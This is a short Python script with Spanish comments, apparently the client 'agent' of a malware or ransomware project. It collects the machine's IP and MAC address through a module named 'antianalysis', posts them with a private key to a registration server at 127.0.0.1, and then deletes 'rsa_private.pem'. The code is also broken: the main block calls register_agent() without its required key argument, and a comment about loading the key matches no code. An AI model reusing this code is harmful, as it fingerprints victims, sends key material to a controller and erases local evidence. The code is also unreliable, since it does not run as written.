import requests
import socket
import uuid
import os
import antianalysis

def get_ip_address():
    ip = socket.gethostbyname(socket.gethostname())
    return ip

# Función principal del agente
def register_agent(private_key):
    # Obtener IP y MAC del agente
    ip = get_ip_address()
    mac = antianalysis.get_mac_address()
    # Cargar la clave privada desde el archivo
    server_url = 'http://127.0.0.1:5000/register_agent'
    data = {
        'ip': ip,
        'mac': mac,
        'private_key': private_key
    }
    response = requests.post(server_url, data=data)
    if response.status_code == 200:
        print("Agente registrado con éxito.")
        os.remove("rsa_private.pem")
    else:
        print(f"Error al registrar el agente: {response.text}")

if __name__ == "__main__":
    register_agent()
